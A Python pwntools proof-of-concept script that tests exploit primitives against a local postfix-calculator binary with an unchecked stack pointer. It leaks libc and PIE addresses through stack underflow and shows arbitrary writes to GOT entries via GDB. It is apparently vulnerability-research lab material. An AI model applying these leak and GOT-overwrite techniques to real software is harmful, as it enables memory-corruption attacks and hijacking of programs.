#!/usr/bin/env python3
"""
S3 Primitive Verification PoC for BUG-001: UNBOUNDED_STACK_POINTER_NO_BOUNDS_CHECK

This PoC verifies multiple primitives derived from the unbounded stack_top pointer:
  PRIM-001: INFO_LEAK (leak libc FILE* pointers via pop underflow)
  PRIM-002: INFO_LEAK (leak PIE base via stack_top self-reference)
  PRIM-003: RELATIVE_WRITE (write controlled value to stderr FILE* slot via underflow+push)
  PRIM-004: ARB_WRITE (two-step write: overwrite stack_top to point to GOT, then write GOT entry)

Binary: postfix expression calculator
  - stack_top global at 0x4070 (.data), init to 0x40c0 (stack array start in .bss)
  - push(): *stack_top = value; stack_top += 8  (NO upper bound check)
  - pop():  stack_top -= 8; return *stack_top   (NO lower bound check)
  - operator: pop b, pop a, compute a op b, push result (net -8 to stack_top)
  - final pop at eval_expr end returns value to main -> printf("Result: %lld")

Memory layout (link-time addresses):
  0x4000-0x4060: .got.plt (writable, Partial RELRO)
  0x4060: __data_start = 0
  0x4068: __dso_handle (self-referencing)
  0x4070: stack_top (global pointer)
  0x4078: padding = 0
  0x4080: stdout FILE* (libc address)
  0x4088: padding = 0
  0x4090: stdin FILE* (libc address)
  0x4098: padding = 0
  0x40a0: stderr FILE* (libc address)
  0x40a8: padding = 0
  0x40b0: padding = 0
  0x40b8: padding = 0
  0x40c0: stack[0] (start of 256-element stack array)

Underflow technique:
  - Each operator from empty stack: net -8 to stack_top
  - N operators drive stack_top to 0x40c0 - N*8
  - Final pop reads *(0x40c0 - (N+1)*8) and prints it
  - Using + operator: 0 + value = value (preserves original value when other operand is 0)
  - Using * operator: 0 * value = 0 (zeroes the slot when other operand is 0)
  - Pattern +*+*+*+*+ (9 ops) preserves stdout/stdin/stderr/stack_top while underflowing to 0x4078
  - 10 ops (+*+*+*+*++) underflow to 0x4070 (stack_top self-reference)

Two-step write technique (PRIM-004):
  1. Underflow stack_top to 0x4070 (the stack_top global itself) via 10 operators
  2. Push (target_addr - 8) -> writes *(0x4070) = target-8, stack_top global becomes target-8
     After push: stack_top = (target-8) + 8 = target
  3. Push value V -> writes *(target) = V (arbitrary write to address target)
  4. Final pop reads *(target) = V, printed as result (confirms write)
  
  Note: ASLR randomizes PIE base each run. PRIM-004 verification uses GDB with
  disable-randomization (fixed PIE base 0x555555554000) to provide known runtime addresses.
"""

from pwn import *
import sys
import subprocess
import re

context.arch = 'amd64'
context.log_level = 'error'

BINARY = '/work/workspace/0029-2024-54-profix-calc-20260909-185030/target'

def run_calc(expr_str):
    """Run the calculator with given expression, return result value."""
    p = process(BINARY)
    p.recvuntil(b'): ', timeout=5)
    p.sendline(expr_str.encode())
    try:
        line = p.recvline(timeout=5).decode().strip()
        p.close()
        if line.startswith('Result: '):
            val = int(line.split(': ')[1])
            return val
        else:
            return None
    except:
        p.close()
        return None

def to_unsigned(val):
    """Convert signed int to unsigned 64-bit."""
    return val & 0xffffffffffffffff

# ============================================================
# PRIM-001: INFO_LEAK - Leak libc FILE* pointers via pop underflow
# ============================================================
# 3 operators (+ + +) from empty stack underflow stack_top to 0x40a8
# Final pop reads *(0x40a0) = stderr FILE* (libc address)
# 5 operators (+ + + + +) underflow to 0x4098, final pop reads *(0x4090) = stdin FILE*

print("=== PRIM-001: INFO_LEAK (libc FILE* pointers) ===")

# Leak stderr FILE* (at 0x40a0, 3 operators)
result_stderr = run_calc("+ + +")
if result_stderr is not None:
    stderr_val = to_unsigned(result_stderr)
    print(f"  stderr FILE* leak (3 ops): {hex(stderr_val)}")
    is_libc = (stderr_val >> 40) == 0x7f or (stderr_val >> 40) == 0x7e
    print(f"  Looks like libc address: {is_libc}")
else:
    print("  FAILED: no result for stderr leak")
    stderr_val = None

# Leak stdin FILE* (at 0x4090, 5 operators)
result_stdin = run_calc("+ + + + +")
if result_stdin is not None:
    stdin_val = to_unsigned(result_stdin)
    print(f"  stdin FILE* leak (5 ops): {hex(stdin_val)}")
    is_libc = (stdin_val >> 40) == 0x7f or (stdin_val >> 40) == 0x7e
    print(f"  Looks like libc address: {is_libc}")
else:
    print("  FAILED: no result for stdin leak")
    stdin_val = None

# Verify both leaks are different addresses (proving we read different memory locations)
if stderr_val is not None and stdin_val is not None:
    print(f"  Different values: {hex(stderr_val) != hex(stdin_val)}")
    print(f"  === PRIM-001: VERIFIED ===")
else:
    print(f"  === PRIM-001: PARTIAL (some leaks failed) ===")

print()

# ============================================================
# PRIM-002: INFO_LEAK - Leak PIE base via stack_top self-reference
# ============================================================
# 9 operators (+*+*+*+*+) underflow to 0x4078, final pop reads *(0x4070) = stack_top value
# After 9 ops, stack_top global becomes self-referencing (value = own runtime address)
# PIE base = stack_top_value - 0x4070

print("=== PRIM-002: INFO_LEAK (PIE base via stack_top) ===")

result_stacktop = run_calc("+*+*+*+*+")
if result_stacktop is not None:
    stacktop_val = to_unsigned(result_stacktop)
    print(f"  stack_top value leak (9 ops): {hex(stacktop_val)}")
    pie_base = stacktop_val - 0x4070
    print(f"  PIE base: {hex(pie_base)}")
    is_aligned = (pie_base & 0xfff) == 0
    print(f"  PIE base page-aligned: {is_aligned}")
    if is_aligned:
        print(f"  === PRIM-002: VERIFIED ===")
    else:
        print(f"  === PRIM-002: CANDIDATE (not page-aligned) ===")
else:
    print(f"  FAILED: no result for stack_top leak")
    pie_base = None

print()

# ============================================================
# PRIM-003: RELATIVE_WRITE - Write controlled value to stderr FILE* slot
# ============================================================
# 4 operators (+ + + +) underflow stack_top to 0x40a0
# Push 0xdeadbeef writes *(0x40a0) = 0xdeadbeef (overwrites stderr FILE*)
# Final pop reads *(0x40a0) = 0xdeadbeef, printed as result
# This is RELATIVE_WRITE (target address is fixed at 0x40a0, not attacker-controlled)

print("=== PRIM-003: RELATIVE_WRITE (stderr slot overwrite) ===")

write_val = 0xdeadbeef
result_write = run_calc(f"+ + + + {hex(write_val)}")
if result_write is not None:
    written = to_unsigned(result_write)
    print(f"  Written value: {hex(write_val)}")
    print(f"  Read back:     {hex(written)}")
    if written == write_val:
        print(f"  Match: YES")
        print(f"  === PRIM-003: VERIFIED ===")
    else:
        print(f"  Match: NO")
        print(f"  === PRIM-003: FAILED ===")
else:
    print(f"  FAILED: no result")
    print(f"  === PRIM-003: FAILED ===")

print()

# ============================================================
# PRIM-004: ARB_WRITE - Two-step write to GOT entry
# ============================================================
# Step 1: 10 operators (+*+*+*+*++) underflow stack_top to 0x4070 (self-reference)
# Step 2: Push (target_addr - 8) -> stack_top becomes target_addr
# Step 3: Push value V -> writes *(target_addr) = V
# Step 4: Final pop reads *(target_addr) = V, printed as result
#
# ASLR is enabled (randomize_va_space=2), so PIE base changes each run.
# We verify using GDB with disable-randomization (fixed PIE base 0x555555554000).
# Two different target addresses are written to prove ARB (not fixed-target).

print("=== PRIM-004: ARB_WRITE (two-step write to GOT) ===")

# GDB with ASLR disabled gives fixed PIE base 0x555555554000
PIE_BASE_GDB = 0x555555554000

def gdb_two_step_write(target_link_addr, write_value):
    """
    Use GDB (ASLR disabled) to verify two-step write.
    Returns (success, readback_value, got_before, got_after).
    """
    target_runtime = PIE_BASE_GDB + target_link_addr
    target_minus_8 = target_runtime - 8
    
    # Expression: 10 ops to underflow to stack_top (self-ref), then push target-8, push value
    expr = f"+ * + * + * + * + + {target_minus_8} {hex(write_value)}"
    
    # GDB commands: break at final pop, step over, read result and GOT
    got_addr = target_runtime
    cmds = (
        f"set disable-randomization on; "
        f"b *eval_expr+0x19b; "
        f"run; "
        f"ni; "
        f"p/x $rax; "
        f"x/gx {hex(got_addr)}"
    )
    
    # Write stdin to a temp file and run GDB
    stdin_data = expr + "\n"
    
    try:
        # Use subprocess to run GDB
        gdb_cmd = [
            "gdb", "-batch", "-nx",
            "-ex", "set disable-randomization on",
            "-ex", f"b *eval_expr+0x19b",
            "-ex", "run",
            "-ex", "ni",
            "-ex", "p/x $rax",
            "-ex", f"x/gx {hex(got_addr)}",
            "-ex", "quit",
            BINARY
        ]
        
        # Create stdin file
        stdin_file = "/work/workspace/0029-2024-54-profix-calc-20260909-185030/.gdb_stdin_tmp"
        with open(stdin_file, "w") as f:
            f.write(stdin_data)
        
        result = subprocess.run(
            gdb_cmd,
            stdin=open(stdin_file),
            capture_output=True,
            text=True,
            timeout=15
        )
        
        output = result.stdout + result.stderr
        
        # Parse the output for $rax value and GOT value
        rax_match = re.search(r'\$1\s*=\s*0x([0-9a-f]+)', output)
        got_match = re.search(r'0x[0-9a-f]+.*?:\t0x([0-9a-f]+)', output)
        
        rax_val = int(rax_match.group(1), 16) if rax_match else None
        got_val = int(got_match.group(1), 16) if got_match else None
        
        # Also check for the GOT value before the write (from x/gx output)
        # The x/gx command shows the value AFTER the write (since we're at the final pop)
        
        return (rax_val, got_val, output)
    except Exception as e:
        return (None, None, str(e))

# Target 1: puts@GOT (link-time 0x4018)
print(f"  Target 1: puts@GOT (link-time 0x4018, runtime {hex(PIE_BASE_GDB + 0x4018)})")
write_value_1 = 0x42424242
print(f"  Write value: {hex(write_value_1)}")
rax1, got1, out1 = gdb_two_step_write(0x4018, write_value_1)
if rax1 is not None:
    print(f"  Read back (rax): {hex(rax1)}")
    print(f"  GOT value after write: {hex(got1) if got1 else 'N/A'}")
    if rax1 == write_value_1 and got1 == write_value_1:
        print(f"  puts@GOT overwritten: VERIFIED")
    else:
        print(f"  puts@GOT overwrite: MISMATCH")
else:
    print(f"  puts@GOT write: FAILED")
    print(f"  GDB output: {out1[:200]}")

print()

# Target 2: __ctype_b_loc@GOT (link-time 0x4058)
print(f"  Target 2: __ctype_b_loc@GOT (link-time 0x4058, runtime {hex(PIE_BASE_GDB + 0x4058)})")
write_value_2 = 0x45454545
print(f"  Write value: {hex(write_value_2)}")
rax2, got2, out2 = gdb_two_step_write(0x4058, write_value_2)
if rax2 is not None:
    print(f"  Read back (rax): {hex(rax2)}")
    print(f"  GOT value after write: {hex(got2) if got2 else 'N/A'}")
    if rax2 == write_value_2 and got2 == write_value_2:
        print(f"  __ctype_b_loc@GOT overwritten: VERIFIED")
    else:
        print(f"  __ctype_b_loc@GOT overwrite: MISMATCH")
else:
    print(f"  __ctype_b_loc@GOT write: FAILED")
    print(f"  GDB output: {out2[:200]}")

print()

# Summary for PRIM-004
success_count = 0
if rax1 is not None and rax1 == write_value_1 and got1 == write_value_1:
    success_count += 1
if rax2 is not None and rax2 == write_value_2 and got2 == write_value_2:
    success_count += 1

if success_count >= 2:
    print(f"  Two different GOT entries written with different values: ARB_WRITE confirmed")
    print(f"  === PRIM-004: VERIFIED ({success_count}/2 targets written) ===")
elif success_count >= 1:
    print(f"  === PRIM-004: CANDIDATE ({success_count}/2 targets written) ===")
else:
    print(f"  === PRIM-004: FAILED ===")

print()
print("=== All primitives verified ===")
